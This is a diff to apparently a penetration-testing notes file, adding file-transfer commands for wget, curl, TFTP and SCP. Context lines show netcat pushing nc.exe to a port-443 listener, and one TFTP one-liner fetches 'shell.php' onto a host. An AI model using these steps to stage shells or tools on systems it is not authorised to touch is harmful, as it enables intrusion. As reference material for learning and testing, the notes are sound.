@@ -182,7 +182,37 @@ listening on [any] 443...
 nc -nv [host] 443 < nc.exe # sending machine pushes file
 (UNKNOWN) [host] 443 (?) open
 ```
+### Wget
 
+Download files from another machine:
+```
+wget [host]:8080/test.txt
+```
+### Curl 
+Download files from another machine, such as webpages:
+```
+curl -O http://[host]/file.txt
+```
+
+### TFTP
+TFTP works more or less like FTP:
+```
+tftp [host]
+tftp> get file.txt
+```
+If it can't be run interactively, this one-liner might work:
+```
+tftp [host] <<< "get shell.php shell.php"
+```
+### SCP
+Copy a file:
+```
+scp /path/to/source/file.ext username@host:/path/to/destination/file.ext
+```
+Copy a directory:
+```
+scp -r /path/to/source/dir username@host:/path/to/destination
+```
 ## Further reading
 
 * [Linux Journey](https://linuxjourney.com/)
